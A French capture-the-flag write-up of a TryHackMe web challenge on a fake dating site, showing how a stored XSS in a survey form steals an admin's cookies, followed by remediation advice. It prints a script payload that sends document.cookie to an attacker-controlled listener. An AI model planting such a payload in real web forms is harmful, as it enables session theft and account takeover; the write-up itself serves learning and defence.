---
tags:
  - Chall
  - TryHackMe
  - LoveAtFirstBreach
  - web
  - XSS
---
## Énoncé
>My Dearest Hacker,
>Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! 💘No algorithms. No AI. Just genuine human connection   
>
>>*You can access the web app here:* `http://MACHINE_IP:5000`
## Retex
On va donc essayer de trouver une faille sur un site de rencontre, qui nous met en contacte avec des gens suivant les réponses d'un formulaire de personnalité.
Avant toute chose, j'aime bien analyser la page et comprendre les redirections possibles.
On peut commencer par un Gobuster.
![[G.png|500]]
Déjà on peut voir qu'il y a une page de login et une admin mais l'admin renvoie vers le login (j'imagine parce que le cookie n'est pas bon)
![[HP.png|500]]
Sur la page "survey", on a juste la possibilité de remplir et envoyer un formulaire. On va donc essayer de voir ce qu'il se passe si on tente une xss.
On va mettre la payload qui suit dans un des champs lors de l'envoie du formulaire, ça va extraire tous les cookies du site, incluant sessions ou tokens.

```java
<script>fetch('http://IP:8000/cookie='+document.cookie);</script>
```
Bien sûr avant d'envoyer le formulaire on ouvre le port 8000 pour anticiper une reception de message.
![[rep.png|500]]
Le site nous dit qu'il a bien pris en compte le formulaire et si on regarde ce qu'on a reçu sur le port 8000 :
![[F.png|500]]
On a bien reçu le flag via les cookies : **==THM%7BXSS_CuP1d_Str1k3s_Ag41n%7D==**

---
## Explication de la faille
La faille exploitée est une **XSS stockée (Stored XSS)** sur le formulaire de survey du site Cupid's Matchmaker.

En gros :
>Le formulaire de personnalité accepte les entrées utilisateur sans les sanitizer correctement. En injectant le `<script>` dans un champ, le code malveillant est stocké côté serveur et exécuté plus tard quand l'équipe (surement un bot admin, malgré le "real human" de l'énoncé) consulte les soumissions.
>On a donc le script qui s'exécute dans le navigateur de l'admin, et exfiltre ses cookies vers notre port 8000 en écoute.
## Pour s'en protéger
Pour se protéger de cette faille, les devs du site devrais combiner validation stricte des entrées et protections côté sortie.
### 1. Validation des entrées : 
- *Listes blanche :* Acceptez seulement les caractères attendus (ex: lettres, chiffres pour un nom) et rejetez tout le reste.
- *Sanitisation serveur :*  Neutraliser les balises HTML/JS avant stockage 
### 2. Protection côté sortie
- *Protection des cookies :* faire en sorte que le cookie ne puisse pas partir vers un site externe (fetch() par exemple) et faire en sorte que JavaScript ne puisse pas lire le cookie.
